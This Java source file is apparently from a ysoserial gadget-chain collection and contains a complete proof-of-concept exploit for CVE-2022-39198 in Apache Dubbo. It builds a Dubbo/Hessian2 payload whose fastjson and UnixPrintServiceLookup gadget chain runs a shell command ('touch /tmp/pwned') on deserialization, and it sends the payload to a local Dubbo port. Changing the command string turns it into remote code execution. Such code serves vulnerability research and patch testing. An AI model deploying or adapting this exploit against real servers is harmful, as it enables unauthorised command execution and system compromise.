package ysoserial.payloads.tabbyGadgetChains.ApacheDubbo;

import com.alibaba.fastjson.JSONObject;
import ysoserial.payloads.util.Reflection;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import sun.misc.Unsafe;
import sun.print.UnixPrintServiceLookup;
import java.io.*;
import java.lang.reflect.Field;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

/*
org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode
org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol#getInvoker
org.apache.dubbo.rpc.RpcInvocation#toString
com.alibaba.fastjson.JSON#toString
sun.print.UnixPrintServiceLookup#getDefaultPrintService
...
Runtime.getRuntime().exec()
 */
public class Poc2_CVE_2022_39198 {
    public static void main(String[] args) throws Exception{
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] header = new byte[16];
        Bytes.short2bytes((short) 0xdabb, header);
        header[2] = (byte) ((byte) 0x80 | 2);

        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();

        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);



        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        Object unix = unsafe.allocateInstance(UnixPrintServiceLookup.class);
        Reflection.setFieldValue(unix, "osname","hack");
        Reflection.setFieldValue(unix, "lpcFirstCom",new String[]{"touch /tmp/pwned","touch /tmp/pwned","touch /tmp/pwned"});

        JSONObject jo = new JSONObject();
        jo.put("oops",unix);

        out.writeUTF("xxxxx");
        out.writeUTF("org.apache.dubbo.metadata.MetadataService");
        out.writeUTF("1.0.0");
        out.writeUTF("$echo");
        out.writeUTF("Ljava/lang/Object;");
        out.writeObject(jo);
        HashMap hkhash = new HashMap();
        hkhash.put("aaa","bbb");
        out.writeObject(hkhash);

        out.flushBuffer();
        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
        byte[] bytes = byteArrayOutputStream.toByteArray();
        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}
